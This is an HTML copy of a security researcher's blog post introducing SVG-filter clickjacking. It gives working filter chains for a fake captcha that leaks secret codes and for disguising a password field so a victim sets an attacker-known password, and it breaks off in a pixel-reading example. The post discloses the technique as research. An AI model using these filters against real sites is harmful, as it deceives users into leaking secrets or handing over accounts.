<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://lyra.horse/blog/2025/12/svg-clickjacking/">Original</a>
    <h1>Trick users and bypass warnings ‚Äì Modern SVG Clickjacking attacks</h1>
    
    <div id="readability-page-1" class="page"><div>
    
  
  <div id="subMeta"><p><time datetime="2025-12-05T14:00:00Z">2025-12-05</time> <span id="tags"><ul><li> ¬¶ <a href="http://iafisher.com/blog/tags/infosec/">infosec</a></li><li> ¬¶ <a href="http://iafisher.com/blog/tags/css/">css</a></li></ul></span>
</p></div>

  <p>Clickjacking is a classic attack that consists of covering up an iframe of some other website in an attempt to trick the user into unintentionally interacting with it. It works great if you need to trick someone into pressing a button or two, but for anything more complicated it‚Äôs kind of unrealistic.</p>
<p>I‚Äôve discovered a new technique that turns classic clickjacking on its head and enables the creation of complex interactive clickjacking attacks, as well as multiple forms of data exfiltration.</p>
<p>I call this technique ‚Äú<strong>SVG clickjacking</strong>‚Äù.</p>
<art-frame id="cover-art" aria-label="Cover art - a win free iPod dialog is connected to a dangerous permissions dialog behind it" role="img"><div aria-hidden="true"><l-3d>
  <l-target><l-tabs><span><a target="_blank" href="https://youtu.be/MSVOhyorGbQ">ü¶ä</a></span><span>File</span><span>Edit</span><span>View</span><span selected="">Share</span><span>Lyra Rebane</span></l-tabs>
    <l-body>

    </l-body>
  </l-target>
  <l-target-menu><span>Private</span><a target="_blank" href="https://jorianwoltjer.com/blog/p/ctf/openecsc-2025-kittychat-secure"><span>Friends</span></a><span>Unlisted</span><span selected="">Public</span></l-target-menu>
  <l-dim></l-dim>
  <l-dialog><p><b>Are you sure?</b></p><p>Everybody will be able to see your secrets.</p></l-dialog>
  <l-note>[ get pixel color at (567,178) ]</l-note>
  <l-line></l-line>
  <l-overlay><p><b>win free ipod</b></p></l-overlay>
  <l-line></l-line>
  <l-note>[ show overlay image #3 ]</l-note>
  <l-line></l-line>
</l-3d></div></art-frame>
<!--
## Adjust until barely visible

Before we get onto the rest of the blog post I'll stop you here for a quick compatibility check. <fx-strike>You should be seeing a pony here -\> [].</fx-strike><fx-off> (the pony is hidden because svg effects are disabled)</fx-off>

If you don't see the pony, or you're having performance issues, disable the SVG effects and the blog post falls back to CSS emulations of said effects.

<label><input type="checkbox" checked name="fx" id="fx"> SVG effects</label>

SVG effects are currently <b><fx-on style="color:green">enabled</fx-on><fx-off style="color:red">disabled</fx-off></b>. 

<style>
  body:has(#fx:checked) {
    fx-off {
      display: none;
      visibility: none;
    }
  }
  body:has(#fx:not(:checked)) {
    fx-on {
      display: none;
      visibility: none;
    }
    fx-strike {
      text-decoration: line-through;
    }
  }
</style>
-->


<!--## Liquid glaCSS-->
<h2 id="liquid-svgs">Liquid SVGs</h2>
<p>The day Apple announced its new Liquid Glass redesign was pretty chaotic. You couldn‚Äôt go on social media without every other post being about the new design, whether it was critique over how inaccessible it seemed, or awe at how realistic the refraction effects were.</p>
<p>Drowning in the flurry of posts, a thought came to mind - how hard would it be to re-create this effect? Could I do this, on the web, without resorting to canvas and shaders? I got to work, and about an hour later I had <a href="https://codepen.io/rebane2001/details/OPVQXMv">a pretty accurate CSS/SVG recreation of the effect</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p>
  
<art-frame id="lGlassDemo" role="img" aria-label="A few album arts with a movable liquid glass effect on top">
<div>
  <div>
    <div>
    <album-card><a target="_blank" href="https://visualdisturbances.bandcamp.com/album/emergency-2"><p>EMERGENCY!</p><p>Girls Rituals</p></a></album-card>
    <album-card><a target="_blank" href="https://acloudyskye.bandcamp.com/album/this-wont-be-the-last-time"><p>This Won&#39;t Be The Last Time</p><p>acloudyskye</p></a></album-card>
    <album-card><a target="_blank" href="https://soundbandit.bandcamp.com/album/sound-bandit-fucking-lives"><p>SOUND BANDIT FUCKING LIVES</p><p>Sound Bandit</p></a></album-card>
    <album-card><a target="_blank" href="https://vyletpony.bandcamp.com/album/love-ponystep"><p>Love &amp; Ponystep</p><p>Vylet Pony</p></a></album-card>
    <album-card><a target="_blank" href="https://ninajirachi.bandcamp.com/album/i-love-my-computer"><p>I Love My Computer</p><p>Ninajirachi</p></a></album-card>
    </div>
    <div>
    <album-card title="mom - 3"><a target="_blank" href="https://blacksquares.bandcamp.com/album/3"></a></album-card>
    <album-card title="glass beach - the first glass beach album"><a target="_blank" href="https://glassbeach.bandcamp.com/album/the-first-glass-beach-album"></a></album-card>
    <album-card title="underscores - wallsocket (director&#39;s cut)"><a target="_blank" href="https://underscores.bandcamp.com/album/wallsocket-directors-cut"></a></album-card>
    <album-card title="patricia taxxon - bicycle"><a target="_blank" href="https://patriciataxxon.bandcamp.com/album/bicycle"></a></album-card>
    <album-card title="yaeji - ep 1+2"><a target="_blank" href="https://kraejiyaeji.bandcamp.com/album/ep-1-2"></a></album-card>
    
    
    
    
    </div>
  </div>
</div>
<div id="liquidOverlay"><div>
  <div>
    <div>
    <album-card><p>EMERGENCY!</p><p>Girls Rituals</p></album-card>
    <album-card><p>This Won&#39;t Be The Last Time</p><p>acloudyskye</p></album-card>
    <album-card><p>SOUND BANDIT FUCKING LIVES</p><p>Sound Bandit</p></album-card>
    <album-card><p>Love &amp; Ponystep</p><p>Vylet Pony</p></album-card>
    <album-card><p>I Love My Computer</p><p>Ninajirachi</p></album-card>
    </div>
    <div>
    <album-card></album-card>
    <album-card></album-card>
    <album-card></album-card>
    <album-card></album-card>
    <album-card></album-card>
    
    
    
    
    </div>
  </div>
  </div>
</div>
<!-- <p id="dragMsg" style="position:absolute;bottom:0px;left:50%;translate: -50% 0; background:#FFFA;padding:8px;border-radius:5px;text-align:center;pointer-events:none">Drag the liquid glass effect around from the bottom-right handle.</p> -->
</art-frame>

<svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
<filter id="displacementFilter4">
    <feImage xlink:href="data:image/svg+xml,%3Csvg width=&#39;200&#39; height=&#39;200&#39; viewBox=&#39;0 0 200 200&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39;%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;rgb%280 0 0 %2F7%25%29&#39; /%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;%23FFF&#39; style=&#39;filter:blur(5px)&#39; /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing9" id="thing9"></feImage>
    <feImage xlink:href="data:image/svg+xml,%3Csvg width=&#39;200&#39; height=&#39;200&#39; viewBox=&#39;0 0 200 200&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39;%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;%23000&#39; /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing1" id="thing1"></feImage>
    <feImage xlink:href="data:image/svg+xml,%3Csvg width=&#39;200&#39; height=&#39;200&#39; viewBox=&#39;0 0 200 200&#39; xmlns=&#39;http://www.w3.org/2000/svg&#39;%3E%3Cdefs%3E%3ClinearGradient id=&#39;gradient1&#39; x1=&#39;0%25&#39; y1=&#39;0%25&#39; x2=&#39;100%25&#39; y2=&#39;0%25&#39;%3E%3Cstop offset=&#39;0%25&#39; stop-color=&#39;%23000&#39;/%3E%3Cstop offset=&#39;100%25&#39; stop-color=&#39;%2300F&#39;/%3E%3C/linearGradient%3E%3ClinearGradient id=&#39;gradient2&#39; x1=&#39;0%25&#39; y1=&#39;0%25&#39; x2=&#39;0%25&#39; y2=&#39;100%25&#39;%3E%3Cstop offset=&#39;0%25&#39; stop-color=&#39;%23000&#39;/%3E%3Cstop offset=&#39;100%25&#39; stop-color=&#39;%230F0&#39;/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x=&#39;0&#39; y=&#39;0&#39; width=&#39;200&#39; height=&#39;200&#39; rx=&#39;26&#39; fill=&#39;%237F7F7F&#39; /%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;%23000&#39; /%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;url(%23gradient1)&#39; style=&#39;mix-blend-mode: screen&#39; /%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;url(%23gradient2)&#39; style=&#39;mix-blend-mode: screen&#39; /%3E%3Crect x=&#39;50&#39; y=&#39;50&#39; width=&#39;100&#39; height=&#39;100&#39; rx=&#39;26&#39; fill=&#39;rgb%28127 127 127 %2F85%25%29&#39; style=&#39;filter:blur(4px)&#39; /%3E%3C/svg%3E" x="0%" y="0%" width="100%" height="100%" result="thing2" id="thing2"></feImage>
      <feGaussianBlur stdDeviation=".6" id="preblur" in="SourceGraphic" result="preblur"></feGaussianBlur>
    <feDisplacementMap id="dispR" in2="thing2" in="preblur" scale="-146.5" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="1 0 0 0 0
              0 0 0 0 0
              0 0 0 0 0
              0 0 0 1 0" result="disp1"></feColorMatrix>
    <feDisplacementMap id="dispG" in2="thing2" in="preblur" scale="-150" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="0 0 0 0 0
              0 1 0 0 0
              0 0 0 0 0
              0 0 0 1 0" result="disp2"></feColorMatrix>
    <feDisplacementMap id="dispB" in2="thing2" in="preblur" scale="-153.5" xChannelSelector="B" yChannelSelector="G"></feDisplacementMap>
      <feColorMatrix type="matrix" values="0 0 0 0 0
              0 0 0 0 0
              0 0 1 0 0
              0 0 0 1 0" result="disp3"></feColorMatrix>
      <feBlend in2="disp2" mode="screen"></feBlend>
      <feBlend in2="disp1" mode="screen"></feBlend>
      <feGaussianBlur stdDeviation="1.3" id="postblur"></feGaussianBlur>
      <feBlend in2="thing9" mode="multiply"></feBlend>
      <feComposite in2="thing1" operator="in"></feComposite>
      <feOffset dx="43" dy="43"></feOffset>
  </filter>
</svg>
<p><em>You can drag around the effect with the <span id="liquidResize"><span>bottom-right circle control thing</span></span> in the demo above (chrome/firefox desktop, chrome mobile).</em></p>
<p><span>Note: This demo is broken in Safari, sorry.</span></p>
<p>My little tech demo made quite a splash online, and even resulted in a <a href="https://80.lv/articles/accurate-apple-s-liquid-glass-effect-recreated-with-css-svg">news article</a> with what is probably the wildest quote about me to date: <em>‚ÄúSamsung and others have nothing on her‚Äù</em>.</p>
<p>A few days passed, and another thought came to mind - would this SVG effect work on top of an iframe?</p>
<p>Like, surely not? The way the effect ‚Äúrefracts light‚Äù<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> is way too complex to work on a cross-origin document.</p>
<p>But, to my surprise, it did.</p>
<p>The reason this was so interesting to me is that my liquid glass effect uses the <code>feColorMatrix</code> and <code>feDisplacementMap</code> SVG filters - changing the colors of pixels, and moving them, respectively. And I could do that on a cross-origin document?</p>
<p>This got me wondering - do any of the other filters work on iframes, and could we turn that into an attack somehow? It turns out that it‚Äôs <!--nearly -->all of them, and yes!</p>
<h2 id="building-blocks">Building blocks</h2>
<p>I got to work, going through every <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element#f">&lt;fe*&gt;</a> SVG element and figuring out which ones can be combined to build our own attack primitives.</p>
<p>These filter elements take in one or more input images, apply operations to them, and output a new image. You can chain a bunch of them together within a single SVG filter, and refer to the output of any of the previous filter elements in the chain.</p>
<p>Let‚Äôs take a look at some of the more useful base elements we can play with:</p>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feImage"><strong>&lt;feImage&gt;</strong></a> - load an image file;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feFlood"><strong>&lt;feFlood&gt;</strong></a> - draw a rectangle;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feOffset"><strong>&lt;feOffset&gt;</strong></a> - move stuff around;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feDisplacementMap"><strong>&lt;feDisplacementMap&gt;</strong></a> - move pixels according to a map;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feGaussianBlur"><strong>&lt;feGaussianBlur&gt;</strong></a> - blur stuff;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feTile"><strong>&lt;feTile&gt;</strong></a> - tiling and cropping utility;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feMorphology"><strong>&lt;feMorphology&gt;</strong></a> - expand/grow light or dark areas;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feBlend"><strong>&lt;feBlend&gt;</strong></a> - blend two inputs according to the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/blend-mode">mode</a>;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feComposite"><strong>&lt;feComposite&gt;</strong></a> - compositing utilities, can be used to apply an alpha matte, or do various arithmetics on one or two inputs;</li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Reference/Element/feColorMatrix"><strong>&lt;feColorMatrix&gt;</strong></a> - apply a color matrix, this allows moving colors between channels and converting between alpha and luma mattes;</li>
</ul>
<p>That‚Äôs quite a selection of utilities!</p>
<p>If you‚Äôre a demoscener<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> you‚Äôre probably feeling right at home. These are  the fundamental building blocks for many kinds of computer graphics, and they can be combined into many useful primitives of our own. So let‚Äôs see some examples.</p>
<h3 id="fake-captcha">Fake captcha</h3>
<p>I‚Äôll start off with an example of basic data exfiltration. Suppose you‚Äôre targeting an iframe that contains some sort of sensitive code. You <em>could</em> ask the user to retype it by itself, but that‚Äôd probably seem suspicious.</p>
<p>What we can do instead is make use of <code>feDisplacementMap</code> to make the text seem like a captcha! This way, the user is far more likely to retype the code.</p>
<art-frame id="fakeCaptcha" flex=""><fake-frame><p>Here is your secret code:</p><p>6c79 7261 706f 6e79</p><p>Don&#39;t share it with anyone!</p></fake-frame><fake-frame><p>Here is your secret code:</p><p>6c79 7261 706f 6e79</p><p>Don&#39;t share it with anyone!</p></fake-frame><div><p>Complete a captcha</p><div><p>What&#39;s written above?</p><div contenteditable="plaintext-only"><p>Good girl!!</p></div></div></div></art-frame>
<pre><code><sx-t>&lt;iframe</sx-t> <sx-r>src</sx-r><sx-t>=</sx-t><sx-v>&#34;...&#34;</sx-v> <sx-r>style</sx-r><sx-t>=</sx-t><sx-v>&#34;filter:url(#captchaFilter)&#34;</sx-v><sx-t>&gt;&lt;/iframe&gt;
&lt;svg</sx-t> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;768&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;768&#34;</sx-v> <sx-r>viewBox</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 768 768&#34;</sx-v> <sx-r>xmlns</sx-r><sx-t>=</sx-t><sx-v>&#34;http://www.w3.org/2000/svg&#34;</sx-v><sx-t>&gt;
  &lt;filter</sx-t> <sx-r>id</sx-r><sx-t>=</sx-t><sx-v>&#34;captchaFilter&#34;</sx-v><sx-t>&gt;
    &lt;feTurbulence</sx-t>
      <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>&#34;turbulence&#34;</sx-v>
      <sx-r>baseFrequency</sx-r><sx-t>=</sx-t><sx-v>&#34;0.03&#34;</sx-v>
      <sx-r>numOctaves</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v>
      <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>&#34;turbulence&#34;</sx-v> <sx-t>/&gt;
    &lt;feDisplacementMap</sx-t>
      <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>&#34;SourceGraphic&#34;</sx-v>
      <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>&#34;turbulence&#34;</sx-v>
      <sx-r>scale</sx-r><sx-t>=</sx-t><sx-v>&#34;6&#34;</sx-v>
      <sx-r>xChannelSelector</sx-r><sx-t>=</sx-t><sx-v>&#34;R&#34;</sx-v>
      <sx-r>yChannelSelector</sx-r><sx-t>=</sx-t><sx-v>&#34;G&#34;</sx-v> <sx-t>/&gt;
  &lt;/filter&gt;
&lt;/svg&gt;</sx-t>
</code></pre>


<p><em>Note: Only the part inside the <code>&lt;filter&gt;</code> block is relevant, the rest is just an example of using filters.</em></p>
<p>Add to this some <span id="color-effects-hover">color effects and random lines</span>, and you‚Äôve got a pretty convincing cap<span>-</span>tcha!</p>
<p>Out of all the attack primitives I‚Äôll be sharing, this one is probably the least useful as sites rarely allow you to frame pages giving out magic secret codes. I wanted to show it though, as it‚Äôs a pretty simple introduction to the attack technique.</p>

<art-frame aria-label="an API response made to look like one from Google&#39;s services" role="figure">)]}&#39;
[[1337],[1,&#34;AIzaSyAtbm8sIHRoaXMgaXNuJ3QgcmVhbCBsb2w&#34;,0,&#34;a&#34;,30],[768972,768973,768932,768984,768972,768969,768982,768969,768932,768958,768951],[105,1752133733,7958389,435644166009,7628901,32481100117144691,28526,28025,1651273575,15411]]</art-frame>
<p>Still, it could come in handy because often times you‚Äôre allowed to frame read-only API endpoints, so maybe there‚Äôs an attack there to discover.</p>
<h3 id="grey-text-hiding">Grey text hiding</h3>
<p>The next example is for situations where you want to trick someone into, for example, interacting with a text input. Oftentimes the inputs have stuff like grey placeholder text in them, so showing the input box by itself won‚Äôt cut it.</p>
<p>Let‚Äôs take a look at our example target (try typing in the box).</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>

<p>In this example we want to trick the user into setting an attacker-known password, so we want them to be able to see the text they‚Äôre entering, but not the grey placeholder text, nor the red ‚Äútoo short‚Äù text.</p>
<p>Let‚Äôs start off by using <code>feComposite</code> with arithmetics to make the grey text disappear. The <code>arithmetic</code> operation takes in two images, <code>i1</code> (<code>in=...</code>) and <code>i2</code> (<code>in2=...</code>), and lets us do per-pixel maths with <code>k1</code>, <code>k2</code>, <code>k3</code>, <code>k4</code> as the arguments according to this formula: <math><mi>r</mi><mo>=</mo><msub><mi>k</mi><mn>1</mn></msub><mo>‚Å¢</mo><msub><mi>i</mi><mn>1</mn></msub><mo>‚Å¢</mo><msub><mi>i</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo>‚Å¢</mo><msub><mi>i</mi><mn>1</mn></msub><mo>+</mo><msub><mi>k</mi><mn>3</mn></msub><mo>‚Å¢</mo><msub><mi>i</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>4</mn></msub></math><sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup>.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>
<pre><code><sx-t>&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
             <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<p><em>Tip! You can leave out the in/in2 parameters if you just want it to be the previous output.</em></p>
<p>It‚Äôs getting there - by multiplying the brightness of the input we‚Äôve made the grey text disappear, but now the black text looks a little suspicious and hard to read, especially on 1x scaling displays.</p>
<p>We <em>could</em> play around with the arguments to find the perfect balance between hiding the grey text and showing the black one, but ideally we‚Äôd still have the black text look the way usually does, just without any grey text. Is that possible?</p>
<p>So here‚Äôs where a really cool technique comes into play - masking. We‚Äôre going to create a matte to ‚Äúcut out‚Äù the black text and cover up everything else. It‚Äôs going to take us quite a few steps to get to the desired result, so lets go through it bit-by-bit.</p>
<p>We start off by cropping the result of our black text filter with <code>feTile</code>.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>
<pre><code><sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>56</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>184</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>22</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<p>Note: Safari seems to be having some trouble with <code>feTile</code>, so if <span>the examples flicker or look blank, read this post in a browser such as Firefox or Chrome. If</span> you&#39;re writing an attack for Safari, you can also achieve cropping by making a luma matte with <code>feFlood</code> and then applying it.</p>
<p>Then we use <code>feMorphology</code> to increase the thickness of the text.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>
<pre><code><sx-t>&lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<p>Now we have to increase the contrast of the mask. I‚Äôm going to do it by first using <code>feFlood</code> to create a solid white image, which we can then <code>feBlend</code> with <code>difference</code> to invert our mask. And then we can use <code>feComposite</code> to multiply<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> the mask for better contrast.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>
<pre><code><sx-t>&lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<p>We have a luma matte now! All that‚Äôs left is to convert it into an alpha matte with <code>feColorMatrix</code>, apply it to the source image with <code>feComposite</code>, and make the background white with <code>feBlend</code>.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame></art-frame>
<pre><code><sx-t>&lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
        <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0
                0 0 0 0 0
                0 0 0 0 0
                0 0 1 0 0&#34;</sx-v> <sx-t>/&gt;
&lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
&lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;</sx-t>
</code></pre>

<p>Looks pretty good, doesn‚Äôt it! If you empty out the box (try it!) you might notice some artifacts that give away what we‚Äôve done, but apart from that it‚Äôs a pretty good way to sort of sculpt and form various inputs around a bit for an attack.</p>
<p>There are all sorts of other effects you can add to make the input seem just right. Let‚Äôs combine everything together into a complete example of an attack.</p>
<art-frame flex=""><fake-frame><div><p>Set a new p‚Äãassword</p><p><span>too short</span></p></div></fake-frame><p>Enter your e-mail address:</p></art-frame>

<pre><code><sx-t>&lt;filter&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v>
               <sx-r>k1</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>4</sx-v> <sx-r>k3</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0</sx-v> <sx-t>/&gt;
  &lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>56</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>184</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>22</sx-v> <sx-t>/&gt;
  &lt;feMorphology</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>erode</sx-v> <sx-r>radius</sx-r><sx-t>=</sx-t><sx-v>3</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-t>/&gt;
  &lt;feFlood</sx-t> <sx-r>flood-color</sx-r><sx-t>=</sx-t><sx-v>#FFF</sx-v> <sx-r>result</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>thick</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>100</sx-v> <sx-t>/&gt;
  &lt;feColorMatrix</sx-t> <sx-r>type</sx-r><sx-t>=</sx-t><sx-v>matrix</sx-v>
      <sx-r>values</sx-r><sx-t>=</sx-t><sx-v>&#34;0 0 0 0 0
              0 0 0 0 0
              0 0 0 0 0
              0 0 1 0 0&#34;</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>in</sx-r><sx-t>=</sx-t><sx-v>SourceGraphic</sx-v> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>in</sx-v> <sx-t>/&gt;
  &lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>21</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>57</sx-v> <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>182</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>20</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feBlend</sx-t> <sx-r>mode</sx-r><sx-t>=</sx-t><sx-v>difference</sx-v> <sx-r>in2</sx-r><sx-t>=</sx-t><sx-v>white</sx-v> <sx-t>/&gt;
  &lt;feComposite</sx-t> <sx-r>operator</sx-r><sx-t>=</sx-t><sx-v>arithmetic</sx-v> <sx-r>k2</sx-r><sx-t>=</sx-t><sx-v>1</sx-v> <sx-r>k4</sx-r><sx-t>=</sx-t><sx-v>0.02</sx-v> <sx-t>/&gt;
&lt;/filter&gt;</sx-t>
</code></pre>

<p>You can see how the textbox is entirely recontextualized now to fit a different design while still being fully functional.</p>
<h3 id="pixel-reading">Pixel reading</h3>
<p>And now we come to what is most likely the most useful attack primitive - pixel reading. That‚Äôs right, you can use SVG filters to read color data off of images and perform all sorts of logic on them to create really advanced and convincing attacks.</p>
<p>The catch is of course, that you‚Äôll have to do everything within SVG filters - there is no way to get the data out<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup>. Despite that, it is very powerful if you get creative with it.</p>
<p>On a higher level, what this lets us do is make everything in a clickjacking attack responsive - fake buttons can have hover effects, pressing them can show fake dropdowns and dialogs, and we can even have fake form validation.</p>
<p>Let‚Äôs start off with a simple example - detecting if a pixel is pure black, and using it to turn another filter on or off.</p>


<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<p>For this target, we want to detect when the user clicks on the box to change its color, and use that to toggle a blur effect.</p>
<p><span>All the examples from here onwards are broken on Safari. Use Firefox or Chrome if you don&#39;t see them.</span></p>

<fake-frame>
  <label for="pixread"></label>
  <p>&lt;--- very cool! click to change color</p>
</fake-frame>
<pre><code><sx-t>&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;50&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;50&#34;</sx-v>
        <sx-r>width</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-r>height</sx-r><sx-t>=</sx-t><sx-v>&#34;4&#34;</sx-v> <sx-t>/&gt;
&lt;feTile</sx-t> <sx-r>x</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v> <sx-r>y</sx-r><sx-t>=</sx-t><sx-v>&#34;0&#34;</sx-v>
